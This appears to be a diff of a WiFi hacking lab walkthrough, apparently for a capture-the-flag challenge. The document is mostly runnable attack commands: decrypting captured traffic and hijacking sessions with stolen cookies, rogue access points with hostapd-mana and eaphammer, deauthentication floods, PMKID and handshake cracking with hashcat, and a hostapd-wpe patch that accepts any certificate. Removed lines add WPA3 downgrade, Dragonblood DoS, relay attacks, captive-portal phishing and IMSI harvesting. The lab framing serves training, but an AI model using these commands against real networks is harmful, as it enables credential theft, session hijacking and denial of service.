+|-----|---------|
+| `-e` | ESSID |
+| `-p` | PSK password |
+
+**Step 2: Analyze decrypted traffic**
+
+```bash
+wireshark ~/wifi/scanc6-01-dec.cap
+# Filter: http
+```
+
+**Extract server IPs:**
+```bash
+tshark -r ~/wifi/scanc6-01-dec.cap -Y "http" -T fields -e ip.dst | sort -u
+# 192.168.2.1 (router)
+# 192.168.2.8 (user server)
+```
+
+**Extract cookies:**
+```bash
+tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.cookie" \
+  -T fields -e ip.src -e ip.dst -e http.cookie
+# 192.168.2.8  192.168.2.1  PHPSESSID=296228e3896440bd508d4c69e11e265c
+```
+
+**Extract Set-Cookie:**
+```bash
+tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.set_cookie" \
+  -T fields -e ip.src -e ip.dst -e http.set_cookie
+```
+
+---
+
+### 5.3. Session Hijacking with Stolen Cookie
+
+**Step 1: Connect to network** (with obtained password — step 5.1.5)
+
+**Step 2: Use cookie to login**
+
+```bash
+# First test
+curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
+  http://192.168.2.1/
+
+# If redirect occurs
+curl -L -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
+  http://192.168.2.1/
+```
+
+**Step 3: Extract flag**
+```bash
+curl -L -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
+  http://192.168.2.1/ | grep -o 'flag{[^}]*}'
+```
+
+---
+
+### 5.4. Checking Client Isolation
+
+**Step 1: Connect to network** (step 5.1.5)
+
+**Step 2: ARP scan**
+```bash
+sudo arp-scan -I wlan3 -l
+```
+
+**Sample output:**
+```
+192.168.2.1  f0:9f:c2:71:22:12  Ubiquiti Networks Inc.   # router
+192.168.2.7  28:6c:07:6f:f9:43  XIAOMI Electronics       # user server
+192.168.2.8  28:6c:07:6f:f9:44  XIAOMI Electronics       # yourself (maybe after MAC)
+```
+
+**Step 3: Access user server**
+```bash
+for ip in 192.168.2.7 192.168.2.9 192.168.2.10; do
+    echo "=== $ip ==="
+    curl -s -m 3 http://$ip/ | grep -o 'flag{[^}]*}'
+done
+```
+
+> **Interpretation:** If `curl` to `192.168.2.7` succeeds → **Client Isolation is disabled** and you retrieved the flag. If timeout → enabled.
+
+---
+
+### 5.5. Rogue AP + Handshake from Probe (Hidden/Absent Network)
+
+**Scenario:** `wifi-offices` network is not in range but clients send Probes.
+
+#### Step 1: Identify Probes
+
+```bash
+tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" \
+  -T fields -e wlan.sa -e wlan.ssid
+# Observed: 78:c1:a7:bf:72:46 → wifi-offices
+```
+
+#### Step 2: Create Rogue AP with hostapd-mana
+
+```conf
+# ~/wifi/hostapd-mana.conf
 interface=wlan1
 driver=nl80211
 hw_mode=g
@@ -544,1029 +659,700 @@ wpa_pairwise=TKIP CCMP
 wpa_passphrase=12345678
 ```
 
+| Parameter | Meaning |
+|---------|---------|
+| `interface=wlan1` | Managed interface (not monitor) |
+| `ssid=wifi-offices` | Target network name |
+| `mana_wpaout=hostapd.hccapx` | Handshake output file |
+| `wpa_passphrase=12345678` | Fake AP password |
+
+#### Step 3: Run and wait for client connection
+
 ```bash
-# 2. Run Rogue AP
-sudo hostapd-mana hostapd.conf
-
-# 3. Deauth client from real AP (if present)
-sudo aireplay-ng -0 10 -a <REAL_BSSID> -c <CLIENT_MAC> wlan0mon
-
-# 4. When client connects, handshake is saved to hostapd.hccapx
-
-# 5. Crack
-hashcat -a 0 -m 22000 hostapd.hccapx /root/rockyou-top100000.txt --force
+sudo hostapd-mana ~/wifi/hostapd-mana.conf
+# Wait for client Probe→Assoc→Handshake
+# Message: AP-STA-POSSIBLE-PSK-MISMATCH (because password is wrong)
 ```
 
-**Note:** If `hashcat -m 2500` errors:
+#### Step 4: Crack Handshake
+
 ```bash
-# Convert hccapx to pcap
+# Direct method
+hashcat -a 0 -m 2500 hostapd.hccapx /root/rockyou-top100000.txt --force
+
+# If error → convert to 22000
 hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
-# Extract 22000
 hcxpcapngtool aux.pcap -o hash.22000
-# Crack
-hashcat -m 22000 hash.22000 rockyou.txt
+hashcat -a 0 -m 22000 hash.22000 /root/rockyou-top100000.txt --force
+
+# Show result
+hashcat -m 22000 hash.22000 --show
+# 3d0695...:020000000100:78c1a7bf7246:wifi-offices:password1
 ```
 
-### 6.4. Connect + Decrypt + Post-Exploit
+→ **Password = `password1`**
+
+#### Step 5: Connect and access
 
 ```conf
-# psk.conf
 network={
-    ssid="wifi-mobile"
-    psk="starwars1"
+    ssid="wifi-offices"
+    psk="password1"
 }
 ```
 
 ```bash
-# Connect
-sudo wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf -B
-sudo dhclient wlan3 -v
-
-# Decrypt traffic
-airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/psk-01.cap
-# Output: psk-01-dec.cap
-
-# Analyze
-wireshark ~/wifi/psk-01-dec.cap
-# Filter: http
-
-# Extract cookie
-tshark -r ~/wifi/psk-01-dec.cap -Y "http.cookie" -T fields -e http.cookie
-
-# Use cookie
-curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" http://192.168.2.1/
-```
-
-### 6.5. Test Client Isolation
-
-```bash
-# Connect to network
-sudo wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf -B
-sudo dhclient wlan3 -v
-
-# ARP scan
-sudo arp-scan -I wlan3 -l
-
-# Test access to another client's server
-curl -s -m 3 http://192.168.2.7/ | grep -o 'flag{[^}]*}'
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/offices.conf
+sudo dhclient wlan2 -v
 ```
 
 ---
 
-<a name="wpa3"></a>
-## 7. Phase 4: WPA3-SAE Branch
+### 5.6. PMKID Attack (Client-less — For Networks Without Clients)
 
-```
-WPA3-SAE (ENC=WPA3, AUTH=SAE)
-│
-├── Transition Mode (WPA2+WPA3)?
-│   │   (RSN Auth Suites: PSK SAE)
-│   │
-│   ├── Yes → Downgrade Attack
-│   │   ├── 1. Build Rogue AP with WPA2-PSK
-│   │   ├── 2. hostapd-mana with wpa_key_mgmt=WPA-PSK
-│   │   ├── 3. Deauth client (if PMF disabled)
-│   │   ├── 4. Client connects to fake AP
-│   │   ├── 5. WPA2 handshake captured
-│   │   └── 6. hashcat -m 22000 (fast!)
-│   │
-│   └── WPA3-only
-│       └── wacker.py (online brute-force)
-│           ├── ./wacker.py --wordlist rockyou.txt --ssid <SSID>
-│           │              --bssid <BSSID> --interface wlan2 --freq 2462
-│           ├── Wait for "Found the password"
-│           └── Connect with key_mgmt=SAE, ieee80211w=2
-│
-└── PMF required (MFP-required)?
-    ├── Yes → Deauth won't work
-    │         → Dragonblood DoS (dragondrain)
-    └── No → Deauth possible
-```
+**Scenario:** `wifi-campus` network without clients — cannot capture Handshake.
 
-### 7.1. Detect Transition Mode
+#### Step 1: Prepare dedicated interface
 
 ```bash
-sudo iw dev wlan2 scan | grep -A 15 "wifi-IT"
+sudo pkill wpa_supplicant
+sudo pkill dhclient
+sudo airmon-ng check kill
 ```
 
-**Output:**
-```
-RSN: * Authentication suites: PSK SAE
-     * Capabilities: MFP-capable (0x008c)
+> ⚠️ **Important:** Do not use `wlan0mon` (on `phy#0` shared with `wlan0`; `hcxdumptool` gives `failed to arm interface` error).
+
+```bash
+# Create monitor interface on separate phy
+sudo iw phy phy70 interface add wlan6mon type monitor
+sudo ip link set wlan6mon up
+sudo iw dev wlan6mon set channel 7
+iw dev wlan6mon info
 ```
 
-| Auth Suites | Capabilities | Interpretation |
-|-------------|--------------|--------|
-| `PSK SAE` | MFP-capable | Transition Mode ✅ |
-| `SAE` | MFP-required | WPA3-only ❌ |
+#### Step 2: Run hcxdumptool
 
-### 7.2. Downgrade Attack (Transition Mode)
+```bash
+sudo hcxdumptool -i wlan6mon -w campus.pcapng -c 7a --rds=2 -A
+```
+
+| Flag | Meaning |
+|-----|---------|
+| `-i wlan6mon` | Dedicated monitor interface |
+| `-w campus.pcapng` | Output file |
+| `-c 7a` | Channel 7, 2.4GHz band |
+| `--rds=2` | Live display of APs/PMKID |
+| `-A` | ACK frames |
+
+**Successful output:**
+```
+CHA|  LAST  |EA123P|   MAC-CL   |   MAC-AP   |ESSID
+  7|11:31:18|ep+  +|980EE416B9E3|f09fc2712231|wifi-campus
+```
+
+#### Step 3: Extract hash
+
+```bash
+hcxpcapngtool -o campus.22000 campus.pcapng
+```
+
+#### Step 4: Crack
+
+```bash
+hashcat -m 22000 -a 0 campus.22000 /root/rockyou-top100000.txt --force
+# → basketball
+```
+
+#### Step 5: Connect
 
 ```conf
-# hostapd-sae.conf
-interface=wlan1
-driver=nl80211
-hw_mode=g
-channel=11
-ssid=wifi-IT
-mana_wpaout=hostapd-management.hccapx
-wpa=2
-wpa_key_mgmt=WPA-PSK     # ← WPA2, not SAE!
-wpa_pairwise=TKIP CCMP
-wpa_passphrase=12345678
-```
-
-```bash
-# 1. Run Rogue AP
-sudo hostapd-mana hostapd-sae.conf
-
-# 2. Deauth client
-sudo aireplay-ng -0 0 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52 wlan0mon
-
-# 3. Crack handshake
-hashcat -a 0 -m 2500 hostapd-management.hccapx rockyou.txt --force
-```
-
-### 7.3. wacker.py (Online Brute-force)
-
-```bash
-# Install
-git clone https://github.com/blunderbuss-wctf/wacker.git
-cd wacker
-
-# Run
-./wacker.py --wordlist ~/rockyou-top100000.txt \
-            --ssid wifi-management \
-            --bssid F0:9F:C2:11:0A:24 \
-            --interface wlan2 \
-            --freq 2462
-```
-
-**Note:** `--freq` must be the AP frequency (not channel):
-- Channel 11 → 2462 MHz
-- Channel 6 → 2437 MHz
-- Channel 1 → 2412 MHz
-
-### 7.4. Connect to WPA3-SAE
-
-```conf
-# wpa3.conf
-ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
-update_config=1
 network={
-    ssid="wifi-management"
-    key_mgmt=SAE
+    ssid="wifi-campus"
+    psk="basketball"
+    key_mgmt=WPA-PSK
     proto=RSN
     pairwise=CCMP
-    group=CCMP
-    psk="chocolate1"
-    ieee80211w=2      # ← PMF required!
+    scan_ssid=1
 }
 ```
 
 ```bash
-sudo wpa_supplicant -i wlan2 -c wpa3.conf -B
-sudo dhclient -v wlan2
+sudo wpa_supplicant -Dnl80211 -iwlan3 -c ~/wifi/campus.conf
+sudo dhclient wlan3 -v
+# Access AP website and retrieve flag
 ```
-
-### 7.5. Dragonblood DoS (WPA3-only, PMF required)
-
-```bash
-# Install
-cd /root/tools/dragondrain-and-time/
-autoreconf -i && ./configure && make
-
-# Run
-cd /root/tools/dragondrain-and-time/src/
-sudo ./dragondrain -d wlan1mon -a F0:9F:C2:71:AF:2F -c 44 -b 54 -n 1 -r 200
-```
-
-**Success indicator:** `[ STATUS: 200 forged handshakes/sec ]`
 
 ---
 
-<a name="mgt"></a>
-## 8. Phase 5: WPA2-Enterprise (MGT) Branch
+## 🏢 Section 6: Attacking MGT (WPA2/WPA3-Enterprise)
 
-```
-WPA2-Enterprise (AUTH=MGT)
-│
-├── Phase 0: Passive Recon (no attack)
-│   ├── tshark -r cap -Y "eap.identity" -T fields -e eap.identity
-│   │   → username (e.g., GLOBAL\GlobalAdmin)
-│   │
-│   └── tshark -r cap -Y "tls.handshake.certificate" -T fields -e tls.handshake.certificate
-│       | xxd -r -p | openssl x509 -inform DER -noout -subject
-│       → CN, O, emailAddress
-│
-├── Phase 1: Identify EAP Method
-│   └── tshark -r cap -Y "eap" -T fields -e eap.type | sort | uniq -c
-│       ├── 4  → EAP-MD5
-│       ├── 6  → EAP-GTC
-│       ├── 13 → EAP-TLS
-│       ├── 21 → EAP-TTLS
-│       ├── 25 → PEAP
-│       ├── 18 → EAP-SIM
-│       ├── 23 → EAP-AKA
-│       └── 50 → EAP-AKA'
-│
-└── Phase 2: Attack based on Method
-    │
-    ├── EAP-MD5 (code 4)
-    │   ├── hcxpcapngtool --eapmd5=legacy.hc4800 capture.cap
-    │   └── hashcat -m 4800 -a 0 legacy.hc4800 rockyou.txt
-    │
-    ├── PEAP (code 25) or EAP-TTLS (code 21)
-    │   │
-    │   ├── Method 1: Evil Twin (eaphammer)
-    │   │   ├── eaphammer --cert-wizard (generate cert)
-    │   │   ├── eaphammer -i wlan2 --auth wpa-eap --essid "target"
-    │   │   │            --creds --autocrack --wordlist rockyou.txt
-    │   │   └── Deauth client
-    │   │
-    │   ├── Method 2: GTC Downgrade (if client validates cert)
-    │   │   ├── eaphammer --creds --negotiate gtc-downgrade
-    │   │   └── plaintext password in log
-    │   │
-    │   └── Method 3: Relay Attack
-    │       ├── berate_ap --wpa-sycophant wlan1 lo target
-    │       └── wpa_sycophant -c conf -i wlan3
-    │
-    ├── EAP-TLS (code 13)
-    │   │
-    │   ├── Case 1: Have real server cert
-    │   │   └── eaphammer --cert-wizard import
-    │   │       --server-cert server.crt --ca-cert ca.crt --private-key server.key
-    │   │
-    │   ├── Case 2: Have CA.key (best!)
-    │   │   ├── openssl genrsa -out fake.key 2048
-    │   │   ├── openssl req -new -key fake.key -out fake.csr
-    │   │   └── openssl x509 -req -in fake.csr -CA ca.crt -CAkey ca.key -out fake.crt
-    │   │
-    │   └── Case 3: Have nothing
-    │       └── hostapd-wpe (accept any cert)
-    │
-    ├── EAP-GTC (code 6)
-    │   └── eaphammer --creds --negotiate gtc-downgrade
-    │
-    ├── EAP-SIM/AKA/AKA' (code 18/23/50)
-    │   ├── 1. Passive: tshark -Y "eap.identity"
-    │   ├── 2. If you only need IMSI:
-    │   │   ├── hostapd with eap_sim_id=0
-    │   │   ├── sim_db with fake IMSI
-    │   │   └── tshark -Y "eap.type == 50" -V | grep IMSI
-    │   └── 3. Extract IMSI from Identity
-    │
-    └── Online Brute-force (any Method)
-        ├── air-hammer -i wlan3 -e target -p rockyou.txt -u userlist
-        └── air-hammer -i wlan3 -e target -P 12345678 -u userlist
-```
-
-### 8.1. Passive Recon (Extract Username and Certificate)
+### 6.1. Prerequisites
 
 ```bash
-# 1. Username from Identity
-tshark -r ~/wifi/scanc44-01.cap -Y "eap.identity" -T fields -e eap.identity | sort -u
-# Output: GLOBAL\GlobalAdmin, anonymous@CONTOSOREG, ...
-
-# 2. Server certificate
-tshark -r ~/wifi/global-01.cap \
-  -Y "tls.handshake.certificate && wlan.sa == F0:9F:C2:71:22:17" \
-  -T fields -e tls.handshake.certificate 2>/dev/null \
-  | head -n 1 | xxd -r -p \
-  | openssl x509 -inform DER -noout -subject -nameopt RFC2253
+sudo apt update
+sudo apt install -y eaphammer hostapd-wpe asleap hashcat john aircrack-ng
+git clone https://github.com/s0lst1c3/eaphammer.git
+cd eaphammer && sudo ./kali-setup
 ```
 
-**Example output:**
-```
-subject=emailAddress=server@WiFiChallenge.com,CN=radius.wifichallenge.com,
-        OU=Server,O=WiFiChallenge,L=Madrid,ST=Madrid,C=ES
-```
+### 6.2. Identifying EAP Type (Recon)
 
-### 8.2. Identify EAP Method
+#### Step 1: Scan network
 
 ```bash
-tshark -r capture.cap -Y "eap" -T fields -e eap.type | sort | uniq -c
+sudo airodump-ng wlan0mon --band abg
+# Find MGT network (e.g., wifi-corp-legacy, CH=44, BSSID=F0:9F:CB:3F:BC:27)
 ```
 
-**EAP code table:**
-
-| Code | Method | Attack |
-|:--:|--------|------|
-| 1 | Identity | Passive (username) |
-| 4 | EAP-MD5 | hashcat -m 4800 |
-| 6 | EAP-GTC | gtc-downgrade |
-| 13 | EAP-TLS | Client certificate |
-| 18 | EAP-SIM | IMSI extraction |
-| 21 | EAP-TTLS | eaphammer + asleap |
-| 23 | EAP-AKA | IMSI extraction |
-| 25 | PEAP | eaphammer + asleap |
-| 50 | EAP-AKA' | IMSI extraction |
-
-### 8.3. EAP-MD5 (Simplest)
+#### Step 2: Capture EAP traffic
 
 ```bash
-# Extract hash
-hcxpcapngtool --eapmd5=legacy.hc4800 legacy-01.cap
+sudo airodump-ng -c 44 --bssid F0:9F:CB:3F:BC:27 \
+  -w ~/wifi/legacy wlan0mon
+```
 
-# Crack
+#### Step 3: Analyze with tshark
+
+```bash
+tshark -r ~/wifi/legacy-01.cap -Y "eap" -T fields \
+  -E header=y -E separator='|' \
+  -e frame.number -e wlan.sa -e wlan.da \
+  -e eap.code -e eap.type -e eap.identity -e eap.md5.value
+```
+
+**EAP codes:**
+
+| Code | EAP Type | Attack Method |
+|----|---------|----------|
+| 4 | EAP-MD5 | Sniff + offline crack (hashcat -m 4800) |
+| 6 | EAP-GTC | Rogue AP + GTC Downgrade (plaintext) |
+| 13 | EAP-TLS | Rogue AP + certificate theft |
+| 21 | EAP-TTLS | Rogue AP + MSCHAPv2 (hashcat -m 5500) |
+| 25 | PEAP | Rogue AP + MSCHAPv2 / GTC Downgrade |
+
+---
+
+### 6.3. EAP-MD5 Attack (Code 4) — Passive Sniffing
+
+**Step 1: Capture** (done above)
+
+**Step 2: Extract Challenge/Response**
+
+```bash
+tshark -r ~/wifi/legacy-01.cap -Y "eap.type == 4" \
+  -T fields -e frame.number -e eap.id -e eap.code -e eap.md5.value
+```
+
+**Sample output:**
+```
+1338  219  1  9d36b0771289ff6cac0d87908e3c3e6f   # Challenge (server)
+1339  219  2  7aa0513eabcf931d0b6b426857e6f573   # Response (client)
+```
+
+**Identity:**
+```
+1337  WORKGROUP\administrator
+```
+
+**Step 3: Convert to hashcat format**
+
+```bash
+hcxpcapngtool --eapmd5=legacy.hc4800 ~/wifi/legacy-01.cap
+```
+
+**Step 4: Crack**
+
+```bash
 hashcat -m 4800 -a 0 legacy.hc4800 /root/rockyou-top100000.txt
+# Output: 7aa051...:9d36b...:db:pinkfloyd7
 ```
 
-### 8.4. PEAP/TTLS (Most Common)
+**Formula:** `Response = MD5(ID || Password || Challenge)`
+
+**Step 5: Construct flag**
+
+```
+flag{WORKGROUP\administrator:pinkfloyd7}
+```
+
+---
+
+### 6.4. PEAP / EAP-TTLS Attack — Rogue AP
+
+**Scenario:** Clients connect to `wifi-corp-legacy` (MGT) and have certificates.
+
+#### Step 1: Identify client and channel
 
 ```bash
-cd /root/tools/eaphammer
+sudo airodump-ng wlan0mon --band abg -w ~/wifi/legacy
+# BSSID = F0:9F:CB:3F:BC:27, CH = 44, Client = 64:32:A8:AD:AB:53
+```
 
-# 1. Generate fake certificate (with real cert details)
-sudo python3 eaphammer --cert-wizard
+#### Step 2: Deauth to force reconnect
 
-# 2. Run Rogue AP
-sudo python3 eaphammer -i wlan2 \
+```bash
+sudo aireplay-ng --deauth 10 -a F0:9F:CB:3F:BC:27 \
+  -c 64:32:A8:AD:AB:53 wlan0mon
+```
+
+#### Step 3: Generate fake certificate
+
+```bash
+cd ~/eaphammer
+python3 eaphammer --cert-wizard
+# → CA and Server certificates are created
+```
+
+#### Step 4: Launch Rogue AP
+
+```bash
+sudo python3 eaphammer -i wlan1 \
   --channel 44 \
   --auth wpa-eap \
-  --essid "wifi-corp" \
+  --essid "wifi-corp-legacy" \
   --creds \
   --autocrack \
   --wordlist /root/rockyou-top100000.txt
+```
 
-# 3. Deauth client (another terminal)
-sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:1A -c 64:32:A8:07:6C:40 wlan0mon
+| Parameter | Meaning |
+|---------|---------|
+| `-i wlan1` | Managed interface |
+| `--channel 44` | Target channel |
+| `--auth wpa-eap` | WPA2-Enterprise |
+| `--essid "..."` | Target network name |
+| `--creds` | Collect credentials |
+| `--autocrack` | Automatic MSCHAPv2 cracking |
+| `--wordlist` | Wordlist |
 
-# 4. If client validates cert (unknown CA error):
-sudo python3 eaphammer -i wlan2 \
+#### Step 5: Successful output (MSCHAPv2)
+
+```
+[+] Captured EAP identity: WORKGROUP\administrator
+[+] MSCHAPv2 challenge: aabbccdd...
+[+] MSCHAPv2 response: 00112233...
+```
+
+**Manual crack (if no `--autocrack`):**
+```bash
+asleap -C <CHALLENGE> -R <RESPONSE> -W /root/rockyou-top100000.txt
+```
+
+**Or with hashcat:**
+```bash
+# Hash format: username::::response:challenge
+hashcat -m 5500 hash.txt /root/rockyou-top100000.txt
+```
+
+#### Step 6: GTC Downgrade (if client rejects certificate)
+
+```bash
+sudo python3 eaphammer -i wlan1 \
   --channel 44 \
   --auth wpa-eap \
-  --essid "wifi-corp" \
+  --essid "wifi-corp-legacy" \
   --creds \
   --negotiate gtc-downgrade
 ```
 
-**MSCHAPv2 output:**
+→ Password appears in log as **plaintext**:
 ```
-domain\username:  CONTOSO\juan.tr
-challenge:        3b:04:8b:cb:93:78:9a:e3
-response:         99:7e:f7:19:b2:b7:2f:e9:15:42:32:88:77:76:ab:a6:3d:ed:28:85:87:33:0a:62
-hashcat NETNTLM:  juan.tr::::997ef...:3b048...
+[+] EAP identity: WORKGROUP\administrator
+[+] GTC Password: pinkfloyd7
 ```
+
+---
+
+### 6.5. EAP-TLS Attack (Code 13) — Rogue AP Accepting Any Certificate
+
+**Scenario:** Mutual authentication with certificates — client certificate must be stolen.
+
+#### Step 1: Compile hostapd-wpe
 
 ```bash
-# Manual crack
-echo 'juan.tr::::997ef...:3b048...' > hash.5500
-hashcat -a 0 -m 5500 hash.5500 rockyou.txt --force
+git clone https://github.com/OpenSecurityResearch/hostapd-wpe.git
+cd hostapd-wpe
+# Download hostapd-2.6.tar.gz from https://w1.fi/releases/
+tar -xzf hostapd-2.6.tar.gz
+cd hostapd-2.6
+patch -p1 < ../hostapd-wpe.patch
+cd hostapd
+make && sudo make install
 ```
 
-### 8.5. EAP-TLS (Hardest)
+#### Step 2: Modify code to accept any certificate
 
-#### Case A: Have real server certificate
-
-```bash
-cd /root/tools/eaphammer
-
-# Import real certificate
-sudo python3 ./eaphammer --cert-wizard import \
-  --server-cert /home/user/Downloads/server.crt \
-  --ca-cert /home/user/Downloads/ca.crt \
-  --private-key /home/user/Downloads/server.key
-
-# Run Rogue AP
-sudo python3 ./eaphammer -i wlan4 --auth wpa-eap --essid "wifi-corp" \
-  --creds --negotiate balanced
-
-# Deauth
-sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:1A -c 64:32:A8:BA:6C:41 wlan0mon
 ```
-
-#### Case B: Have CA.key (Best!)
-
-```bash
-# Generate fake certificate for any user
-openssl genrsa -out client.key 2048
-openssl req -config client.conf -new -key client.key -out client.csr
-openssl x509 -days 730 -extfile client.ext \
-  -CA ca.crt -CAkey ca.key -CAserial ca.serial \
-  -in client.csr -req -out client.crt
+File: src/crypto/tls_openssl.c
+Change: SSL_set_verify(ssl, SSL_VERIFY_PEER, ...) 
+    →  SSL_set_verify(ssl, SSL_VERIFY_NONE, ...)
 ```
+Then `make && make install` again.
+
+#### Step 3: Config
 
 ```conf
-# wpa_tls.conf
-network={
-    ssid="wifi-global"
-    scan_ssid=1
-    proto=RSN
-    key_mgmt=WPA-EAP
-    eap=TLS
-    identity="GLOBAL\GlobalAdmin"
-    ca_cert="./ca.crt"
-    client_cert="./client.crt"
-    private_key="./client.key"
-}
-```
-
-```bash
-sudo wpa_supplicant -Dnl80211 -i wlan3 -c ~/Downloads/wpa_tls.conf -B
-sudo dhclient wlan3 -v
-```
-
-### 8.6. Relay Attack (PEAP)
-
-**Scenario:** Client rejects fake certificate. We relay the hash to the real AP.
-
-```bash
-# Terminal 1: Rogue AP
-cd ~/tools/berate_ap/
-sudo ./berate_ap --eap --mana-wpe --wpa-sycophant \
-  --mana-credout outputMana.log -c 44 wlan1 lo wifi-regional-tablets
-
-# Terminal 2: Relay
-cd ~/tools/wpa_sycophant/
-sudo ./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
-
-# Terminal 3: Deauth
-sudo aireplay-ng --ignore-negative-one -0 0 \
-  -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55 wlan0mon
-```
-
-**`wpa_sycophant_example.conf`:**
-```conf
-network={
-  ssid="wifi-regional"     # ← network you want to enter
-  scan_ssid=1
-  key_mgmt=WPA-EAP
-  identity=""
-  anonymous_identity=""
-  password=""
-  eap=PEAP
-  phase1="peapver=1"
-  phase2="auth=MSCHAPV2"
-  bssid_blacklist=F0:9F:C2:00:00:00   # ← ignore our fake AP
-}
-```
-
-### 8.7. Brute-force with air-hammer
-
-```bash
-cd ~/tools/air-hammer
-
-# Method 1: one user + password list
-echo 'CONTOSO\test' > test.user
-python2 ./air-hammer.py -i wlan3 -e wifi-corp -p rockyou.txt -u test.user
-
-# Method 2: user list + one password (Password Spray)
-cat /root/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > users.txt
-python2 ./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u users.txt
-```
-
-### 8.8. Evil Twin + Phishing (Hostile Portal)
-
-**Scenario:** Client sends Probe for another network.
-
-```bash
-# 1. Run Rogue AP with Hostile Portal
-cd ~/tools/eaphammer
-sudo python3 ./eaphammer --essid "WiFi-Restaurant" --interface wlan2 --hostile-portal
-
-# 2. Deauth client
-sudo aireplay-ng --ignore-negative-one -0 0 \
-  -a F0:9F:C2:71:22:17 -c 64:32:A8:BC:53:51 wlan0mon
-
-# 3. Extract NetNTLMv2
-cd ~/tools/eaphammer
-cat logs/Responder-Session.log | grep NTLMv2 | grep Hash | awk '{print $9}' > responder.5600
-
-# 4. Crack
-hashcat -a 0 -m 5600 responder.5600 rockyou.txt --force
-```
-
-**Or with Captive Portal:**
-```bash
-sudo python3 ./eaphammer --essid "WiFi-Restaurant" --interface wlan4 --captive-portal
-
-# Sniff POST
-sudo tshark -i wlan4 -Y "http.request.method == \"POST\"" -T fields -e http.file_data
-# Output: username=CORPO\god&password=tommy1
-```
-
-### 8.9. IMSI Extraction (EAP-SIM/AKA/AKA')
-
-```bash
-# 1. Passive: view Identity
-sudo airodump-ng wlan0mon -c 48 --bssid F0:9F:C2:71:22:19 -w recon
-tshark -r recon-01.cap -Y "eap.identity" -T fields -e eap.identity
-# Output: 6214070028194561@wlan.mnc007.mcc214.wifichallenge.com
-
-# 2. Identify exact Method
-tshark -r recon-01.cap -Y "eap.type == 3" -V | grep "Desired Auth Type"
-# Output: Desired Auth Type: UMTS Authentication and Key Agreement' EAP (EAP-AKA') (50)
-
-# 3. Build hostapd with AKA'
-nano /etc/hostapd.eap_user
-# Content (with TAB):
-# *	AKA'
-
-nano hostapd-imsi.conf
-```
-
-```conf
-interface=wlan4
+# /etc/hostapd-wpe/hostapd-wpe.conf
+interface=wlan1
+ssid=wifi-corp-legacy
+channel=44
 driver=nl80211
-ssid=wifi-passpoint
-channel=48
-hw_mode=a
-auth_algs=1
 wpa=2
 wpa_key_mgmt=WPA-EAP
-rsn_pairwise=CCMP
 ieee8021x=1
 eap_server=1
-eap_sim_id=0
-eap_sim_db=file:/tmp/sim_db
-eap_user_file=/etc/hostapd.eap_user
-eap_sim_aka_result_ind=1
+eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+server_cert=/etc/hostapd-wpe/certs/server.pem
+private_key=/etc/hostapd-wpe/certs/server.key
+dh_file=/etc/hostapd-wpe/certs/dh
 ```
+
+#### Step 4: Run
 
 ```bash
-# 4. Build fake sim_db
-echo "001010000000001 00000000000000000000000000000000 00000000000000000000000000000000" | sudo tee /tmp/sim_db
-
-# 5. Run hostapd
-sudo hostapd ~/wifi/hostapd-imsi.conf
-
-# 6. Parallel sniffing
-sudo tshark -i wlan1mon -w /tmp/imsi.pcap
-
-# 7. Deauth
-sudo aireplay-ng --ignore-negative-one -0 10 -a F0:9F:C2:71:22:19 -c 64:32:A8:BA:18:60 wlan1mon
-
-# 8. Extract IMSI
-sudo tshark -r /tmp/imsi.pcap -Y "eap.type == 50" -V | grep -iE "Identity|IMSI"
+sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+tail -f /var/log/hostapd-wpe.log
 ```
 
-**Output:**
-```
-Identity: 6214070028194561@wlan.mnc007.mcc214.wifichallenge.com
+#### Step 5: Deauth and wait for client connection
+
+```bash
+sudo aireplay-ng --deauth 10 -a <BSSID_LEGIT> -c <CLIENT_MAC> wlan0mon
 ```
 
-**Final IMSI (remove prefix 6):** `214070028194561`
+**Output:** Client certificate is saved in log.
 
 ---
 
-<a name="owe"></a>
-## 9. Phase 6: OWE Branch (Enhanced Open)
-
-```
-OWE (ENC=WPA3, AUTH=OWE)
-│
-├── Direct connection (works 99% of the time)
-│   ├── key_mgmt=OWE, ieee80211w=2
-│   ├── wpa_supplicant + dhclient
-│   └── admin/admin → flag
-│
-└── If it fails:
-    ├── DragonDrain (DoS on OWE handshake)
-    │   └── dragondrain -d wlan1mon -a <BSSID> -c 44 -r 200
-    │
-    └── Retry
-```
-
-### 9.1. Connect to OWE
-
-```conf
-# gratis.conf
-network={
-    ssid="wifi-gratis"
-    key_mgmt=OWE
-    ieee80211w=2
-    scan_ssid=1
-}
-```
+### 6.6. EAP-GTC Attack — GTC Downgrade
 
 ```bash
-sudo wpa_supplicant -Dnl80211 -i wlan3 -c gratis.conf -B
-sudo dhclient wlan3 -v
+sudo python3 eaphammer -i wlan1 \
+  --channel <CH> \
+  --auth wpa-eap \
+  --essid "<SSID_TARGET>" \
+  --creds \
+  --negotiate gtc-downgrade
 ```
 
-### 9.2. DragonDrain (If Connection Fails)
-
-```bash
-cd /root/tools/dragondrain-and-time/
-autoreconf -i && ./configure && make
-cd src/
-sudo ./dragondrain -d wlan1mon -a F0:9F:C2:71:AF:2F -c 44 -b 54 -n 1 -r 200
+→ Plaintext password in terminal:
+```
+[+] EAP identity: CORP\jsmith
+[+] GTC Password: MySecretPassword123!
 ```
 
 ---
 
-<a name="wps"></a>
-## 10. Phase 7: WPS Branch
+### 6.7. MGT Attacks Summary Table
 
